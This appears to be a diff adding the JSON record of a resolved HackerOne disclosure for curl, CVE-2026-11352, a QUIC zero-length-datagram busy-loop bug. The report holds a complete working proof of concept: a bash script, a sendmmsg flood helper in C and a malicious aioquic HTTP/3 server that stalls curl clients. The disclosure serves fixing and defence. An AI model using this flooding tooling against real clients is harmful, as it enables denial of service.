@@ -1,0 +1,113 @@
+{
+  "id": 3783438,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgzNDM4",
+  "url": "https://hackerone.com/reports/3783438",
+  "title": "CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-05T03:49:59.586Z",
+  "submitted_at": "2026-06-05T03:50:01.124Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vectorqueue",
+    "url": "/vectorqueue",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-11352"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:29:05.940Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:14:53.328Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\ncurl's QUIC UDP receive helper ignores zero-length UDP datagrams before counting them against the per-call packet budget. On Linux, `recvmmsg_packets()` loops while `pkts < max_pkts`, but `if(!mmsg[i].msg_len) continue;` runs before `pkts` is incremented. The `recvmsg_packets()` backend has the same no-progress pattern for `if(!nread) continue;`. A malicious HTTP/3/QUIC peer can continuously send zero-length UDP datagrams to the connected QUIC socket and keep curl inside `vquic_recv_packets(..., max_pkts=1000, ...)`. In my end-to-end CLI PoC with a real HTTP/3 server that completed the QUIC handshake before switching to zero-length datagrams, `curl --http3-only --max-time 2` was still running after 30 seconds and had to be killed; the same setup also reproduced with `WAIT_SECS=60` locally. The fallback `recvfrom_packets()` already counts a received datagram before skipping zero-length payloads, which indicates the safer intended budget accounting.\n\n## Affected version\nValidated on Linux x86_64 with an HTTP/3-enabled curl built from the signed `curl-8_20_0` release tag. In this repository snapshot the tag's `curlver.h` still reports `8.20.0-DEV`, but the tag object is `curl-8_20_0` with tag message `8.20.0`.\n\n`curl -V` from the reproduced build:\n\n```text\ncurl 8.20.0-DEV (Linux) libcurl/8.20.0-DEV OpenSSL/3.5.6 zlib/1.2.11 libpsl/0.21.0 ngtcp2/1.23.0 nghttp3/1.16.0\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS HSTS HTTP3 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets\n```\n\nSource tags checked:\n\n- `curl-8_18_0`, `curl-8_19_0`, and `curl-8_20_0` contain the vulnerable zero-length skip before `pkts` is advanced in `recvmmsg_packets()` and `recvmsg_packets()`.\n- `curl-8_17_0` does not contain this same zero-length skip pattern.\n- Current master / `8.21.0-DEV` also contains the pattern.\n\nRelevant code in `lib/vquic/vquic.c`:\n\n```c\nwhile(pkts < max_pkts) {\n  ...\n  if(!mmsg[i].msg_len)\n    continue;\n  ...\n  pkts += (mmsg[i].msg_len + gso_size - 1) / gso_size;\n}\n\nfor(pkts = 0; pkts < max_pkts;) {\n  ...\n  if(!nread)\n    continue;\n  ...\n  pkts += (nread + gso_size - 1) / gso_size;\n}\n\n/* contrast: recvfrom_packets() */\n++pkts;\nif(!nread)\n  continue;\n```\n\n## Steps To Reproduce:\nRun the following self-contained CLI PoC on Linux. It does not call any repository-local PoC file and does not hook or modify curl. The script writes temporary helper sources under `mktemp`, compiles a `sendmmsg()`-based zero-length flood helper, starts a real `aioquic` HTTP/3 server, completes the QUIC handshake, sends a minimal HTTP/3 response byte, and then switches the same peer address/port to continuous zero-length UDP datagrams.\n\nThe script first tries `CURL_BIN`, then common in-tree HTTP/3 builds, then `curl` from `PATH`. By default it checks whether `curl --http3-only --max-time 2` is still stuck after 30 seconds; `WAIT_SECS=60` also reproduced locally. If `aioquic` / `cryptography` are missing, it tries `python3 -m pip install --user aioquic cryptography service_identity` automatically.\n\n```bash\nbash <<'BASH'\nset -euo pipefail\n\nCURL_BIN=\"${CURL_BIN:-}\"\nWAIT_SECS=\"${WAIT_SECS:-30}\"\nMAX_TIME=\"${MAX_TIME:-2}\"\nCONNECT_TIMEOUT=\"${CONNECT_TIMEOUT:-2}\"\nZERO_FLOOD_HELPERS=\"${ZERO_FLOOD_HELPERS:-64}\"\n\nneed() {\n  command -v \"$1\" >/dev/null 2>&1 || { echo \"$1 is required\" >&2; exit 2; }\n}\n\nneed python3\nneed cc\n\npick_curl() {\n  local c\n  for c in \\\n    \"${CURL_BIN:-}\" \\\n    \"$PWD\"/build-http3-curl/src/curl \\\n    \"$PWD\"/scratch/build-curl-8.20.0-http3/src/curl \\\n    \"$PWD\"/build-*/src/curl \\\n    \"$(command -v curl 2>/dev/null || true)\"; do\n    [ -n \"$c\" ] || continue\n    [ -x \"$c\" ] || continue\n    \"$c\" -V 2>/dev/null | grep -q 'HTTP3' || continue\n    printf '%s\\n' \"$c\"\n    return 0\n  done\n  return 1\n}\n\nCURL_BIN=\"$(pick_curl || true)\"\n[ -n \"$CURL_BIN\" ] || {\n  echo \"No HTTP/3-enabled curl binary found. Set CURL_BIN=/path/to/http3-curl.\" >&2\n  exit 2\n}\n\nTMPDIR=\"$(mktemp -d)\"\nSRV_PID=\"\"\nCURL_PID=\"\"\ntrap 'set +e; [ -n \"$CURL_PID\" ] && kill \"$CURL_PID\" 2>/dev/null; [ -n \"$SRV_PID\" ] && kill \"$SRV_PID\" 2>/dev/null; rm -rf \"$TMPDIR\"' EXIT\n\nif ! python3 - <<'PY' >/dev/null 2>&1; then\nimport aioquic  # noqa: F401\nimport cryptography  # noqa: F401\nPY\n  if python3 -m pip --version >/dev/null 2>&1; then\n    echo \"Installing Python deps: aioquic cryptography service_identity\" >&2\n    python3 -m pip install --user aioquic cryptography service_identity\n  else\n    echo \"Missing Python deps: aioquic and cryptography\" >&2\n    exit 2\n  fi\nfi\n\npython3 - <<'PY' >/dev/null 2>&1 || {\nimport aioquic  # noqa: F401\nimport cryptography  # noqa: F401\nPY\n  echo \"Failed to import aioquic / cryptography after installation attempt\" >&2\n  exit 2\n}\n\ncat > \"$TMPDIR/sendmmsg_zero_flood_helper.c\" <<'HELPER_C'\n#define _GNU_SOURCE\n#include <arpa/inet.h>\n#include <errno.h>\n#include <netinet/in.h>\n#include <signal.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\n#ifndef BATCH\n#define BATCH 1024\n#endif\n\nstatic volatile sig_atomic_t stop_flag;\n\nstatic void on_signal(int signo)\n{\n  (void)signo;\n  stop_flag = 1;\n}\n\nint main(int argc, char **argv)\n{\n  struct sockaddr_in peer;\n  struct iovec iov[BATCH];\n  struct mmsghdr msg[BATCH];\n  unsigned char dummy = 0;\n  unsigned long long sent_datagrams = 0;\n  unsigned long long send_calls = 0;\n  unsigned long long send_errors = 0;\n  int fd;\n  int i;\n\n  if(argc != 4) {\n    fprintf(stderr, \"usage: %s <fd> <ip> <port>\\n\", argv[0]);\n    return 2;\n  }\n\n  signal(SIGTERM, on_signal);\n  signal(SIGINT, on_signal);\n\n  fd = atoi(argv[1]);\n  memset(&peer, 0, sizeof(peer));\n  peer.sin_family = AF_INET;\n  peer.sin_port = htons((uint16_t)atoi(argv[3]));\n  if(inet_pton(AF_INET, argv[2], &peer.sin_addr) != 1) {\n    perror(\"inet_pton\");\n    return 2;\n  }\n\n  memset(msg, 0, sizeof(msg));\n  memset(iov, 0, sizeof(iov));\n  for(i = 0; i < BATCH; ++i) {\n    iov[i].iov_base = &dummy;\n    iov[i].iov_len = 0;\n    msg[i].msg_hdr.msg_iov = &iov[i];\n    msg[i].msg_hdr.msg_iovlen = 1;\n    msg[i].msg_hdr.msg_name = &peer;\n    msg[i].msg_hdr.msg_namelen = sizeof(peer);\n  }\n\n  while(!stop_flag) {\n    int rc = sendmmsg(fd, msg, BATCH, 0);\n    if(rc > 0) {\n      sent_datagrams += (unsigned)rc;\n      ++send_calls;\n    }\n    else if(rc < 0) {\n      if(errno != EINTR) {\n        ++send_errors;\n        if(errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS)\n          usleep(100);\n      }\n    }\n  }\n\n  printf(\"PEER_STATS sent_datagrams=%llu send_calls=%llu send_errors=%llu\\n\",\n         sent_datagrams, send_calls, send_errors);\n  fflush(stdout);\n  return 0;\n}\nHELPER_C\n\ncat > \"$TMPDIR/server.py\" <<'PY'\n#!/usr/bin/env python3\nimport asyncio\nimport contextlib\nimport ipaddress\nimport os\nimport signal\nimport socket\nimport subprocess\nimport tempfile\nfrom datetime import datetime, timedelta\nfrom typing import Optional, Tuple\n\nfrom aioquic.asyncio import QuicConnectionProtocol\nfrom aioquic.asyncio.server import QuicServer\nfrom aioquic.h3.connection import H3_ALPN, H3Connection\nfrom aioquic.h3.events import HeadersReceived\nfrom aioquic.quic.configuration import QuicConfiguration\nfrom aioquic.quic.events import HandshakeCompleted, ProtocolNegotiated, QuicEvent\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.x509.oid import NameOID\n\n\ndef make_cert_pair(tmpdir: str) -> Tuple[str, str]:\n    key = ec.generate_private_key(ec.SECP256R1())\n    subject = issuer = x509.Name(\n        [x509.NameAttribute(NameOID.COMMON_NAME, \"localhost\")]\n    )\n    cert = (\n        x509.CertificateBuilder()\n        .subject_name(subject)\n        .issuer_name(issuer)\n        .public_key(key.public_key())\n        .serial_number(x509.random_serial_number())\n        .not_valid_before(datetime.utcnow() - timedelta(days=1))\n        .not_valid_after(datetime.utcnow() + timedelta(days=7))\n        .add_extension(\n            x509.SubjectAlternativeName(\n                [\n                    x509.DNSName(\"localhost\"),\n                    x509.IPAddress(ipaddress.IPv4Address(\"127.0.0.1\")),\n                ]\n            ),\n            critical=False,\n        )\n        .sign(key, hashes.SHA256())\n    )\n    cert_path = os.path.join(tmpdir, \"cert.pem\")\n    key_path = os.path.join(tmpdir, \"key.pem\")\n    with open(cert_path, \"wb\") as fp:\n        fp.write(cert.public_bytes(serialization.Encoding.PEM))\n    with open(key_path, \"wb\") as fp:\n        fp.write(\n            key.private_bytes(\n                serialization.Encoding.PEM,\n                serialization.PrivateFormat.PKCS8,\n                serialization.NoEncryption(),\n            )\n        )\n    return cert_path, key_path\n\n\nclass ZeroFloodProtocol(QuicConnectionProtocol):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self._http: Optional[H3Connection] = None\n        self._peer = None\n        self._flood_procs = []\n        self._flood_socks = []\n        self._attack_mode = False\n\n    def connection_made(self, transport):\n        super().connection_made(transport)\n        sock = transport.get_extra_info(\"socket\")\n        if sock is not None:\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)\n\n    def datagram_received(self, data, addr):\n        self._peer = addr\n        if self._attack_mode:\n            return\n        super().datagram_received(data, addr)\n\n    def quic_event_received(self, event: QuicEvent) -> None:\n        if isinstance(event, ProtocolNegotiated) and event.alpn_protocol in H3_ALPN:\n            self._http = H3Connection(self._quic)\n            self.transmit()\n\n        if self._http is not None:\n            for h3_event in self._http.handle_event(event):\n                if isinstance(h3_event, HeadersReceived) and not self._attack_mode:\n                    self._http.send_headers(\n                        h3_event.stream_id,\n                        [\n                            (b\":status\", b\"200\"),\n                            (b\"server\", b\"aioquic-zero\"),\n                            (b\"content-type\", b\"text/plain\"),\n                        ],\n                        end_stream=False,\n                    )\n                    self._http.send_data(h3_event.stream_id, b\"x\", end_stream=False)\n                    super().transmit()\n                    self._attack_mode = True\n                    self._start_flood()\n                self.transmit()\n\n        if isinstance(event, HandshakeCompleted):\n            print(f\"HANDSHAKE_COMPLETED alpn={event.alpn_protocol}\", flush=True)\n\n    def transmit(self) -> None:\n        if self._attack_mode:\n            return\n        super().transmit()\n\n    def close(self) -> None:\n        self._stop_flood()\n        super().close()\n\n    def _start_flood(self) -> None:\n        if self._peer is None or self._transport is None or self._flood_procs:\n            return\n        helper = os.environ[\"ZERO_FLOOD_HELPER\"]\n        helpers = int(os.environ.get(\"ZERO_FLOOD_HELPERS\", \"64\"))\n        bind_addr = self._transport.get_extra_info(\"socket\").getsockname()\n        for _ in range(helpers):\n            flood_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            flood_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            if hasattr(socket, \"SO_REUSEPORT\"):\n                flood_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            flood_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)\n            flood_sock.bind(bind_addr)\n            self._flood_socks.append(flood_sock)\n            proc = subprocess.Popen(\n                [helper, str(flood_sock.fileno()), self._peer[0], str(self._peer[1])],\n                pass_fds=(flood_sock.fileno(),),\n            )\n            self._flood_procs.append(proc)\n        print(f\"ZERO_FLOOD_STARTED helper=sendmmsg helpers={helpers}\", flush=True)\n\n    def _stop_flood(self) -> None:\n        for proc in self._flood_procs:\n            with contextlib.suppress(ProcessLookupError):\n                proc.terminate()\n        for proc in self._flood_procs:\n            with contextlib.suppress(subprocess.TimeoutExpired):\n                proc.wait(timeout=1.0)\n        for flood_sock in self._flood_socks:\n            with contextlib.suppress(OSError):\n                flood_sock.close()\n        self._flood_procs = []\n        self._flood_socks = []\n\n\nasync def main() -> int:\n    tmpdir = tempfile.mkdtemp(prefix=\"aioquic-zero-\")\n    cert_path, key_path = make_cert_pair(tmpdir)\n    configuration = QuicConfiguration(alpn_protocols=H3_ALPN, is_client=False)\n    configuration.load_cert_chain(cert_path, key_path)\n    configuration.idle_timeout = 300.0\n\n    loop = asyncio.get_running_loop()\n    _, server = await loop.create_datagram_endpoint(\n        lambda: QuicServer(\n            configuration=configuration,\n            create_protocol=ZeroFloodProtocol,\n            session_ticket_fetcher=None,\n            session_ticket_handler=None,\n            retry=False,\n            stream_handler=None,\n        ),\n        local_addr=(\"127.0.0.1\", 0),\n        reuse_port=True,\n    )\n    print(f\"PORT={server._transport.get_extra_info('sockname')[1]}\", flush=True)\n\n    stop_event = asyncio.Event()\n\n    def stop(*_args):\n        stop_event.set()\n\n    with contextlib.suppress(NotImplementedError):\n        loop.add_signal_handler(signal.SIGTERM, stop)\n        loop.add_signal_handler(signal.SIGINT, stop)\n\n    await stop_event.wait()\n    server.close()\n    await asyncio.sleep(0)\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(asyncio.run(main()))\nPY\n\ncc -O2 -Wall -Wextra \\\n  \"$TMPDIR/sendmmsg_zero_flood_helper.c\" \\\n  -o \"$TMPDIR/sendmmsg_zero_flood_helper\"\n\necho \"curl_bin=$CURL_BIN\"\n\"$CURL_BIN\" -V | sed -n '1,4p'\n\nSRV_LOG=\"$TMPDIR/server.log\"\nCURL_ERR=\"$TMPDIR/curl.err\"\nCURL_OUT=\"$TMPDIR/curl.out\"\n\nPYTHONWARNINGS=ignore \\\nZERO_FLOOD_HELPER=\"$TMPDIR/sendmmsg_zero_flood_helper\" \\\nZERO_FLOOD_HELPERS=\"$ZERO_FLOOD_HELPERS\" \\\npython3 -u \"$TMPDIR/server.py\" >\"$SRV_LOG\" 2>&1 &\nSRV_PID=$!\n\nPORT=\"\"\nfor _ in $(seq 1 200); do\n  if ! kill -0 \"$SRV_PID\" 2>/dev/null; then\n    echo \"server exited before becoming ready\" >&2\n    cat \"$SRV_LOG\" >&2 || true\n    exit 2\n  fi\n  PORT=\"$(sed -n 's/^PORT=//p' \"$SRV_LOG\" | head -n 1)\"\n  [ -n \"$PORT\" ] && break\n  sleep 0.05\ndone\n\n[ -n \"$PORT\" ] || {\n  echo \"server did not print a port\" >&2\n  cat \"$SRV_LOG\" >&2 || true\n  exit 2\n}\n\nURL=\"https://127.0.0.1:$PORT/\"\nSTART_S=\"$(date +%s)\"\n\"$CURL_BIN\" -q --http3-only --max-time \"$MAX_TIME\" --connect-timeout \"$CONNECT_TIMEOUT\" \\\n  --noproxy '*' -k -sS \"$URL\" >\"$CURL_OUT\" 2>\"$CURL_ERR\" &\nCURL_PID=$!\n\nsleep \"$WAIT_SECS\"\nif kill -0 \"$CURL_PID\" 2>/dev/null; then\n  CURL_STILL_RUNNING=1\n  kill -KILL \"$CURL_PID\" 2>/dev/null || true\n  wait \"$CURL_PID\" 2>/dev/null || true\n  CURL_EXIT=\"killed\"\nelse\n  CURL_STILL_RUNNING=0\n  set +e\n  wait \"$CURL_PID\"\n  CURL_EXIT=\"$?\"\n  set -e\nfi\nCURL_PID=\"\"\nEND_S=\"$(date +%s)\"\n\nkill \"$SRV_PID\" 2>/dev/null || true\nwait \"$SRV_PID\" 2>/dev/null || true\nSRV_PID=\"\"\n\necho \"url=$URL\"\necho \"requested_max_time=$MAX_TIME\"\necho \"observed_seconds=$((END_S - START_S))\"\necho \"curl_still_running_after_${WAIT_SECS}s=$CURL_STILL_RUNNING\"\necho \"curl_exit=$CURL_EXIT\"\nsed -n '1,20p' \"$SRV_LOG\"\nif [ -s \"$CURL_ERR\" ]; then\n  echo \"curl_stderr_begin\"\n  sed -n '1,20p' \"$CURL_ERR\"\n  echo \"curl_stderr_end\"\nfi\n\nif [ \"$CURL_STILL_RUNNING\" = \"1\" ] &&\n   grep -q '^HANDSHAKE_COMPLETED' \"$SRV_LOG\" &&\n   grep -q '^ZERO_FLOOD_STARTED' \"$SRV_LOG\"; then\n  echo \"VULNERABLE: completed QUIC handshake and then zero-length UDP datagrams kept curl running past --max-time.\"\n  exit 0\nfi\n\necho \"NOT REPRODUCED\"\nexit 1\nBASH\n```\n\nExample output from my local `build-http3-curl/src/curl` build:\n\n```text\ncurl_bin=/home/yanzhen/curl/curl/build-http3-curl/src/curl\ncurl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.6 zlib/1.2.11 libpsl/0.21.0 ngtcp2/1.23.0 nghttp3/1.16.0\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS HSTS HTTP3 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets\nurl=https://127.0.0.1:50949/\nrequested_max_time=2\nobserved_seconds=30\ncurl_still_running_after_30s=1\ncurl_exit=killed\nPORT=50949\nHANDSHAKE_COMPLETED alpn=h3\nZERO_FLOOD_STARTED helper=sendmmsg helpers=64\nPEER_STATS sent_datagrams=1106944 send_calls=1081 send_errors=0\nPEER_STATS sent_datagrams=1084416 send_calls=1059 send_errors=0\n...\nVULNERABLE: completed QUIC handshake and then zero-length UDP datagrams kept curl running past --max-time.\n```\n\nThe key property here is that the server is a real QUIC/H3 peer first and only\nswitches to zero-length UDP datagrams after the client has completed the\nhandshake and started HTTP/3. In my local validation, this same setup also kept\ncurl stuck past `WAIT_SECS=60` before I killed it.\n\n## Impact\n\n## Summary:\nA malicious HTTP/3/QUIC peer can remotely deny service to a curl/libcurl client by continuously sending zero-length UDP datagrams from the connected QUIC peer address. The datagrams are not valid QUIC packets, but the affected receive helpers consume them without counting them against `max_pkts`, so the current `vquic_recv_packets()` call can remain busy until the socket becomes empty or the process is externally killed. During that time normal transfer-level escape paths, including command-line `--max-time` / `CURLOPT_TIMEOUT` handling, do not get a chance to run because control does not return to the caller. For applications using libcurl in a single-threaded multi/event loop, this can also starve unrelated transfers or application work sharing the same loop. The attacker does not need memory corruption or authentication bypass; the impact is CPU/event-loop resource exhaustion and stuck transfers for HTTP/3/QUIC clients.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
